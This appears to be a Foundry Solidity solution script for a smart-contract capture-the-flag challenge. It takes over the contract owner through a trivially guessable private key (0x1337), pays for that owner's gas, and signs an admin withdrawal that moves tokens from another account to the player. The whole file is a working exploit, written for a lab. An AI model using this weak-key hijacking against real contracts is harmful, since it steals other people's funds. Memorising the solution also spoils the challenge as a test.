// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {Challenge} from "../src/Challenge.sol";

contract Solve is Script {
    function requestWithdrawal() public {
        Challenge challenge = Challenge(address(vm.envAddress("CHALLENGE_ADDRESS")));
        uint256 PLAYER_PRIVATE_KEY = vm.envUint("PLAYER_PRIVATE_KEY");

        uint256 OWNER_PRIVATE_KEY = 0x1337;
        require(vm.addr(OWNER_PRIVATE_KEY) == challenge.OWNER());

        // Needed because the owner address has no money for gas :(
        vm.startBroadcast(PLAYER_PRIVATE_KEY);
        (bool ok, ) = vm.addr(OWNER_PRIVATE_KEY).call{value: 10 ether}("");
        require(ok, "Transfer failed");
        vm.stopBroadcast();

        vm.startBroadcast(OWNER_PRIVATE_KEY);
        challenge.bigen().adminRequestWithdrawal(
            challenge.TIM_COOK(),
            16 * 10 ** 18,
            challenge.PLAYER()
        );
        vm.stopBroadcast();
    }

    function finalizeWithdrawal() public {
        Challenge challenge = Challenge(address(vm.envAddress("CHALLENGE_ADDRESS")));
        uint256 PLAYER_PRIVATE_KEY = vm.envUint("PLAYER_PRIVATE_KEY");

        vm.startBroadcast(PLAYER_PRIVATE_KEY);
        challenge.bigen().finalizeWithdrawal(challenge.TIM_COOK());
        vm.stopBroadcast();

        require(challenge.isSolved(), "Not solved");
    }

    // Needed to generate a new block, since automining is disabled in the task anvil instance.
    function mine() public {
        uint256 PLAYER_PRIVATE_KEY = vm.envUint("PLAYER_PRIVATE_KEY");

        vm.startBroadcast(PLAYER_PRIVATE_KEY);
        (bool ok, ) = address(0).call{value: 1 wei}("");
        require(ok, "Transfer failed");
        vm.stopBroadcast();
    }
}
